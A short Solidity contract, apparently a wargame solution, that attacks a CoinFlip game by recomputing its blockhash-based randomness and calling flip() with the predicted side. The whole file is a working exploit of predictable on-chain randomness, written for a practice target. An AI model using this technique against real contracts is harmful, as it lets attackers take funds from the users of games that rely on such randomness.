// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract AttackCoinFlip {
    CoinFlip coinFlip;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 c = blockValue / FACTOR;
        bool side = c == 1 ? true : false;

        try coinFlip.flip(side) returns (bool res) {
            return res;
        } catch Error(string memory reason) {
            revert(reason);
        }
    }
}
